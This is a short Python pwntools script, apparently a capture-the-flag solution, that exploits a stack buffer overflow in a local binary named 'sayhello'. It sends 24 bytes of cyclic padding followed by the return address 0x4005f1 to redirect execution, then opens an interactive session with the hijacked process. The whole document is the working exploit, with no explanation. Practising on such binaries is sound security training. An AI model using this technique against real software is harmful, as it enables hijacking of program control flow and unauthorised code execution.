#!/usr/bin/python -i

from pwn import *

r = process('./sayhello')

p = ''
p += cyclic(24)
p += p64(0x4005f1)

r.send(p + '\n')
r.interactive()

